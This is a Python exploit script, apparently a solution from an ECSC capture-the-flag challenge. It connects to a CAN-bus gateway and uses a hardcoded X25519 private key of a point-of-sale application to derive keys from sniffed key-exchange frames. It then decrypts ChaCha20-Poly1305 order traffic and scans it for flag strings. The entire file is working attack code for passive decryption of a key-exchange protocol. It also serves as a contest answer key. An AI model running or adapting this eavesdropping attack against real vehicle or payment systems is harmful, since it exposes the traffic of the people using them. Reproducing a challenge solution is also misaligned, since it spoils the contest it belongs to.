#!/usr/bin/env python3
import hashlib
import requests
import msgpack
import can
import re
from pwn import *

from cryptography.hazmat.primitives.asymmetric.x25519 \
    import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.serialization \
    import Encoding, PublicFormat
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead \
    import ChaCha20Poly1305
from cryptography.exceptions import InvalidTag

# Exploit utils, should be in the same folder
import util

if __name__ == '__main__':
    gw_port = 10020
    api_port = 10021
    ip = '10.10.2.1'
    base_url = f'http://{ip}:{api_port}'

    #context.log_level = 'debug'
    r = remote(ip, gw_port)

    ## We know the hardcoded key of the point-of-sale application
    ## so we wait and listen for a key exchange
    msg = util.CanFilter([
        # MSGID_KEY_EXCH_PUBKEY_BROADCAST,
        # MSGID_KEY_EXCH_SHARE_SYMMETRIC
        (0x1ffffffe, 0x100), 
        # MSGID_POS_ORDER_DATA
        (0x1fffffff, 0x201)
    ])
    r.send(msg.pack())
    
    # Track protocol state
    POS_PRIV = bytes.fromhex(
        '28e061ca05413138c510f34de52d0d7e'
        '7d25de83b75ee7059ade4a93b8fcfd42'
    )
    pos_privkey = X25519PrivateKey.from_private_bytes(POS_PRIV)
    ks_pubkey = None
    derived_key = None
    symmetric_key = None
    sessions = []
    session_data = {}
    flags_found = set()

    # Have a long running loop for message collection
    info('Sniffing CAN-bus traffic in a long-running loop')
    unpacker = msgpack.Unpacker(r, use_list=False)
    for msg in unpacker:
        if msg[0] == util.ToCanMsgType.CAN_FRAME:
            msg = util.CanFrame.unpack(msg[1])
            can_msg = msg.can_message
            if can_msg.arbitration_id == 0x100:
                # Got keyserver public key
                pubkey = bytes(can_msg.data[:32])
                ks_pubkey = X25519PublicKey.from_public_bytes(pubkey)
                shared_key = pos_privkey.exchange(ks_pubkey)
                derived_key = HKDF(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=None,
                    info=b'keyserver-exch'
                ).derive(shared_key)
            elif can_msg.arbitration_id == 0x101:
                if derived_key is None:
                    continue

                # Got symmetric key, try decrypting
                nonce = bytes(can_msg.data[:12])
                ct = bytes(can_msg.data[12:])
                cipher = ChaCha20Poly1305(derived_key)
                try:
                    symmetric_key = cipher.decrypt(nonce, ct, None)
                except InvalidTag:
                    continue
            elif can_msg.arbitration_id == 0x201:
                if symmetric_key is None:
                    continue
                if len(can_msg.data) < 34:
                    continue

                # Try decrypting
                session_id = u32(bytes(can_msg.data[:4]), endian='big')
                cipher = ChaCha20Poly1305(symmetric_key)
                data = b''
                try:
                    ad = bytes(can_msg.data[:5])
                    nonce = bytes(can_msg.data[len(ad):len(ad) + 12])
                    ct = bytes(can_msg.data[len(ad) + len(nonce):])

                    data = cipher.decrypt(nonce, ct, ad)
                except InvalidTag:
                    info('invalid tag')

                if session_id not in session_data:
                    session_data[session_id] = b''
                sessions.append(session_id)
                sessions = sessions[-200:]
                session_data[session_id] += data
        elif msg[0] == util.ToCanMsgType.CAN_ERROR:
            error(util.CanError(msg[1]))

        # List all session data
        for s in set(sessions):
            m = re.search(b'ECSC_[A-Za-z0-9\\+/]{32}', session_data[s])
            if m:
                flag = m.group(0)
                if flag not in flags_found:
                    info(flag)
                    flags_found.add(flag)

